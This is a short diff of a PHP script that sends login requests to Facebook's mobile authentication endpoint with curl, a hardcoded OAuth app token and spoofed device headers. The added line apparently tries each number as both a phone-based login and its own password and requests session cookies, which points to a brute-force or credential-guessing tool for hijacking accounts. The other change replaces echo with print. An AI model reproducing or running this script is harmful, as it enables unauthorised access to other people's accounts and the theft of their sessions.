@@ -8,6 +8,7 @@ $vars = [
                 'fb_api_caller_class'=> 'com.facebook.katana.server.handler.Fb4aAuthHandler',
                 'fb_api_req_friendly_name'=> 'authLogin'
     ];
+$vars ="format=json&device_id=0cd272a7-17dc-4766-958e-5b48799250bf&email=2'.$number.'&password='.$number.'&credentials_type=password&generate_session_cookies=1&error_detail_type=button_with_disabled&machine_id='.random_machine_id().'&locale=en_US&client_country_code=US&fb_api_req_friendly_name=authenticate";
 $headers = [
                 'Authorization' => 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                 'X-Fb-Connection-Type' => 'mobile.LTE',
@@ -31,7 +32,7 @@ $server_output = curl_exec ($ch);
 
 curl_close ($ch);
 
-echo  $server_output ;
+print  $server_output ;
 
 
 ?>
